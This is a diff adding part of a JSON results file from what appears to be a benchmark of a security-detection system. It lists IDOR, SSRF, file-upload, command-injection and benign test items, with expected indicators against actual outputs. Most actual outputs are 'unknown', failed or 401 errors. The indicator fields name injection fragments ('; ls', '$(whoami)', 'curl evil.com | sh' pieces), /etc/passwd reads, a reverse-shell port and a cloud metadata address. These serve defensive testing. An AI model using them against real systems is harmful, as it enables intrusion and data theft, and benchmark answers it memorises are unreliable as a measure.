+      "duration": 75.6210069656372,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "user_id:1"
+        ],
+        "risk_range": [
+          55,
+          85
+        ],
+        "attack_type": "idor",
+        "difficulty": "medium"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 51,
+      "task_type": "data_exfiltration",
+      "task_id": "6a3b49cb-a665-4b8c-9e70-fee3239fae64",
+      "status": "completed",
+      "duration": 75.63083505630493,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "user_id:2"
+        ],
+        "risk_range": [
+          55,
+          85
+        ],
+        "attack_type": "idor",
+        "difficulty": "medium"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 52,
+      "task_type": "data_exfiltration",
+      "task_id": "217c730d-ae13-4cc7-9670-e6b14009c713",
+      "status": "completed",
+      "duration": 75.6653413772583,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "user_id:3"
+        ],
+        "risk_range": [
+          55,
+          85
+        ],
+        "attack_type": "idor",
+        "difficulty": "medium"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 53,
+      "task_type": "data_exfiltration",
+      "task_id": "96881998-8d1f-40b1-b8de-296e68fdc377",
+      "status": "completed",
+      "duration": 75.63652873039246,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "order_history"
+        ],
+        "risk_range": [
+          50,
+          80
+        ],
+        "attack_type": "idor",
+        "difficulty": "medium"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 54,
+      "task_type": "data_exfiltration",
+      "task_id": "7f30e9d8-fafa-47dc-a6c7-8ea21a405c61",
+      "status": "completed",
+      "duration": 75.66285800933838,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "order_history"
+        ],
+        "risk_range": [
+          50,
+          80
+        ],
+        "attack_type": "idor",
+        "difficulty": "medium"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 55,
+      "task_type": "data_exfiltration",
+      "task_id": "78ff6c29-12a4-4f79-93b1-a90d88ef06be",
+      "status": "completed",
+      "duration": 45.481871128082275,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "localhost",
+          "3001"
+        ],
+        "risk_range": [
+          75,
+          100
+        ],
+        "attack_type": "ssrf",
+        "difficulty": "medium"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 56,
+      "task_type": "data_exfiltration",
+      "task_id": "7a3bef58-9764-412a-be89-2a689c86149d",
+      "status": "completed",
+      "duration": 60.59074664115906,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "169.254.169.254",
+          "meta-data"
+        ],
+        "risk_range": [
+          75,
+          100
+        ],
+        "attack_type": "ssrf",
+        "difficulty": "hard"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 57,
+      "task_type": "data_exfiltration",
+      "task_id": "4801f966-32c7-4c07-ab3b-0224cca2c3d0",
+      "status": "completed",
+      "duration": 75.5380368232727,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "::1"
+        ],
+        "risk_range": [
+          75,
+          100
+        ],
+        "attack_type": "ssrf",
+        "difficulty": "hard"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 58,
+      "task_type": "data_exfiltration",
+      "task_id": "0197daac-6883-4f51-a7fb-f853ae426ee2",
+      "status": "completed",
+      "duration": 60.56050252914429,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "127.0.0.1",
+          "application-configuration"
+        ],
+        "risk_range": [
+          75,
+          100
+        ],
+        "attack_type": "ssrf",
+        "difficulty": "hard"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 59,
+      "task_type": "data_exfiltration",
+      "task_id": "779acc9f-a3b6-4177-98a6-9ed6d75955be",
+      "status": "completed",
+      "duration": 60.48000121116638,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "0x7f000001"
+        ],
+        "risk_range": [
+          75,
+          100
+        ],
+        "attack_type": "ssrf",
+        "difficulty": "hard"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 60,
+      "task_type": "malware",
+      "task_id": "68751ddf-ee07-4078-b321-fb90f65bfaa3",
+      "status": "completed",
+      "duration": 196.4180736541748,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "malware.exe",
+          "MZ header"
+        ],
+        "risk_range": [
+          70,
+          100
+        ],
+        "attack_type": "file_upload",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 85,
+      "actual_iocs": [],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 61,
+      "task_type": "malware",
+      "task_id": "d9ccf5c7-8ca8-4ad8-9a34-e31b711d7741",
+      "status": "completed",
+      "duration": 196.21739268302917,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "shell.php",
+          "system()"
+        ],
+        "risk_range": [
+          70,
+          100
+        ],
+        "attack_type": "file_upload",
+        "difficulty": "medium"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 75,
+      "actual_iocs": [],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 62,
+      "task_type": "malware",
+      "task_id": "835b1baf-760c-4837-a86c-13bdb69f79f1",
+      "status": "completed",
+      "duration": 271.74088287353516,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "xxe.xml",
+          "/etc/passwd",
+          "ENTITY"
+        ],
+        "risk_range": [
+          70,
+          100
+        ],
+        "attack_type": "file_upload",
+        "difficulty": "hard"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 85,
+      "actual_iocs": [],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 63,
+      "task_type": "malware",
+      "task_id": "1f1373e4-2315-4622-893d-781d25e6fe7e",
+      "status": "timeout",
+      "duration": 301.08184695243835,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "polyglot.jpg",
+          "<script>"
+        ],
+        "risk_range": [
+          70,
+          100
+        ],
+        "attack_type": "file_upload",
+        "difficulty": "hard"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 0,
+      "actual_iocs": [],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 64,
+      "task_type": "malware",
+      "status": "error",
+      "duration": 0.0018172264099121094,
+      "error": "HTTP Error 401: Unauthorized",
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "reverse_shell.py",
+          "socket.connect",
+          "4444"
+        ],
+        "risk_range": [
+          70,
+          100
+        ],
+        "attack_type": "file_upload",
+        "difficulty": "medium"
+      }
+    },
+    {
+      "idx": 65,
+      "task_type": "malware",
+      "task_id": "fe634b2d-f386-4707-8d21-e1d19c0425ff",
+      "status": "failed",
+      "duration": 226.55604481697083,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "; ls",
+          "command injection"
+        ],
+        "risk_range": [
+          80,
+          100
+        ],
+        "attack_type": "command_injection",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 0,
+      "actual_iocs": [],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 66,
+      "task_type": "malware",
+      "task_id": "6f2fe60b-a0f3-411a-b02e-6a159dfdb154",
+      "status": "failed",
+      "duration": 241.59931755065918,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "| cat",
+          "/etc/passwd"
+        ],
+        "risk_range": [
+          80,
+          100
+        ],
+        "attack_type": "command_injection",
+        "difficulty": "medium"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 0,
+      "actual_iocs": [],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 67,
+      "task_type": "malware",
+      "task_id": "72351ce0-4012-462d-a750-f53f7eb83892",
+      "status": "failed",
+      "duration": 226.59309577941895,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "$(whoami)",
+          "command substitution"
+        ],
+        "risk_range": [
+          80,
+          100
+        ],
+        "attack_type": "command_injection",
+        "difficulty": "medium"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 0,
+      "actual_iocs": [],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 68,
+      "task_type": "malware",
+      "task_id": "0ef52ef0-7b81-4b45-9fd2-928b5bb96688",
+      "status": "timeout",
+      "duration": 300.9453055858612,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "`id`",
+          "command injection"
+        ],
+        "risk_range": [
+          80,
+          100
+        ],
+        "attack_type": "command_injection",
+        "difficulty": "medium"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 0,
+      "actual_iocs": [],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 69,
+      "task_type": "malware",
+      "status": "error",
+      "duration": 0.0022640228271484375,
+      "error": "HTTP Error 401: Unauthorized",
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "curl",
+          "evil.com",
+          "| sh"
+        ],
+        "risk_range": [
+          80,
+          100
+        ],
+        "attack_type": "command_injection",
+        "difficulty": "hard"
+      }
+    },
+    {
+      "idx": 70,
+      "task_type": "benign_activity",
+      "task_id": "81c05825-28b9-4ec7-a114-f7b4f6d17638",
+      "status": "completed",
+      "duration": 196.3558473587036,
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          20
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 50,
+      "actual_iocs": [],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 71,
+      "task_type": "benign_activity",
+      "task_id": "d6458e65-d0f8-41cf-ad51-8802d6cdcfa5",
+      "status": "completed",
+      "duration": 241.49400162696838,
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          20
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 70,
+      "actual_iocs": [],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 72,
+      "task_type": "benign_activity",
+      "task_id": "91a6385e-2a25-4c89-a77f-607ee2906055",
+      "status": "completed",
+      "duration": 226.48106384277344,
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          20
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 50,
+      "actual_iocs": [],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 73,
+      "task_type": "benign_activity",
+      "task_id": "aa62e3fc-c06f-44c6-8cdf-64eddcb8fa3d",
+      "status": "timeout",
+      "duration": 301.1282138824463,
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          20
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 0,
+      "actual_iocs": [],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 74,
+      "task_type": "benign_activity",
+      "status": "error",
+      "duration": 0.0013117790222167969,
+      "error": "HTTP Error 401: Unauthorized",
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          20
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "idx": 75,
+      "task_type": "benign_activity",
+      "task_id": "da1b8102-c538-4040-9343-7004a684e878",
+      "status": "completed",
+      "duration": 211.24697494506836,
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          20
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 50,
+      "actual_iocs": [],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 76,
+      "task_type": "benign_activity",
+      "task_id": "57a9ea6c-0a57-4406-af61-24c2e50c5335",
+      "status": "completed",
+      "duration": 181.20253133773804,
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          20
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 50,
+      "actual_iocs": [],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 77,
+      "task_type": "benign_activity",
+      "task_id": "48d48f68-ef3b-4cce-a5ad-af1e43358260",
+      "status": "completed",
+      "duration": 196.46364450454712,
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          20
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 50,
+      "actual_iocs": [],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 78,
+      "task_type": "benign_activity",
+      "task_id": "44f669b5-f10d-4ce8-ad45-853b24202937",
+      "status": "timeout",
+      "duration": 301.58116149902344,
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          20
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 0,
+      "actual_iocs": [],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 79,
+      "task_type": "benign_activity",
+      "status": "error",
+      "duration": 0.0013980865478515625,
+      "error": "HTTP Error 401: Unauthorized",
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          20
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "idx": 80,
+      "task_type": "benign_activity",
+      "task_id": "5e674180-6a84-4176-903d-15a967b4b46b",
+      "status": "failed",
+      "duration": 196.36508345603943,
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          10
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 0,
+      "actual_iocs": [],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 81,
+      "task_type": "benign_activity",
+      "task_id": "3b9fbe98-d1cf-417b-bbcc-be3208c05e10",
+      "status": "failed",
+      "duration": 226.4710021018982,
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          10
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 0,
+      "actual_iocs": [],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 82,
+      "task_type": "benign_activity",
+      "task_id": "60f7fc76-8d48-4903-8b7f-cf605103ab1a",
+      "status": "failed",
+      "duration": 241.68054819107056,
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          10
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 0,
+      "actual_iocs": [],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 83,
+      "task_type": "benign_activity",
+      "task_id": "b46c4a38-c4e4-48f8-88b2-1590fb0bb218",
+      "status": "timeout",
+      "duration": 301.12532901763916,
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          10
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 0,
+      "actual_iocs": [],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 84,
+      "task_type": "benign_activity",
+      "status": "error",
+      "duration": 0.004952192306518555,
+      "error": "HTTP Error 401: Unauthorized",
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          10
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "idx": 85,
+      "task_type": "benign_activity",
+      "task_id": "491516fa-17ed-4812-95a1-2e99c1210027",
+      "status": "failed",
+      "duration": 271.8427891731262,
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          10
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 0,
+      "actual_iocs": [],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 86,
+      "task_type": "benign_activity",
+      "task_id": "0c73dc9d-5898-4f04-9250-85510a194d15",
+      "status": "failed",
+      "duration": 181.27934074401855,
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          10
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 0,
+      "actual_iocs": [],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 87,
+      "task_type": "benign_activity",
+      "task_id": "bd09c003-a263-434b-86ef-b35d2d92eacc",
+      "status": "failed",
+      "duration": 226.5413327217102,
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          10
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 0,
+      "actual_iocs": [],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 88,
+      "task_type": "benign_activity",
+      "task_id": "367f1c13-d965-47d6-ab25-e784c4e33775",
+      "status": "timeout",
+      "duration": 301.116131067276,
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          10
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 0,
+      "actual_iocs": [],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 89,
+      "task_type": "benign_activity",
+      "status": "error",
+      "duration": 0.002499818801879883,
+      "error": "HTTP Error 401: Unauthorized",
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          10
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "idx": 90,
+      "task_type": "benign_activity",
+      "task_id": "645ca797-a7d3-40ce-8d48-c6501da3eb0d",
+      "status": "failed",
+      "duration": 271.73996663093567,
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          15
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 0,
+      "actual_iocs": [],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 91,
+      "task_type": "benign_activity",
+      "task_id": "dffb21df-aede-4a0d-a06f-07e07f8cdec5",
+      "status": "failed",
+      "duration": 271.8865683078766,
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          15
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 0,
+      "actual_iocs": [],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 92,
+      "task_type": "benign_activity",
+      "task_id": "cdb373b9-0ca8-4382-8e15-ab297b21c158",
+      "status": "timeout",
+      "duration": 301.86435532569885,
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          15
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 0,
+      "actual_iocs": [],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 93,
+      "task_type": "benign_activity",
+      "status": "error",
+      "duration": 0.0035610198974609375,
+      "error": "HTTP Error 401: Unauthorized",
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          15
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "idx": 94,
+      "task_type": "benign_activity",
+      "status": "error",
+      "duration": 0.003128528594970703,
+      "error": "HTTP Error 401: Unauthorized",
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          15
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "idx": 95,
+      "task_type": "benign_activity",
+      "task_id": "bcd48c2d-c109-46fb-957b-d1599e23ce99",
+      "status": "failed",
+      "duration": 256.63554191589355,
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          15
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 0,
+      "actual_iocs": [],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 96,
+      "task_type": "benign_activity",
+      "task_id": "ab10c92c-e44f-49b3-9e9a-aa8ad224f55f",
+      "status": "failed",
+      "duration": 256.67475962638855,
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          15
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 0,
+      "actual_iocs": [],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 97,
+      "task_type": "benign_activity",
+      "task_id": "fda50ffd-88d3-4dfc-9119-ac9c7f35fc2b",
+      "status": "failed",
+      "duration": 241.75476217269897,
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          15
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 0,
+      "actual_iocs": [],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 98,
+      "task_type": "benign_activity",
+      "task_id": "3a49fb08-d743-41c5-8fa6-3fcee4fc6b2b",
+      "status": "timeout",
+      "duration": 300.6164174079895,
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          15
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 0,
+      "actual_iocs": [],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 99,
+      "task_type": "benign_activity",
+      "status": "error",
+      "duration": 0.0016896724700927734,
+      "error": "HTTP Error 401: Unauthorized",
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          15
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    }
+  ]
+}
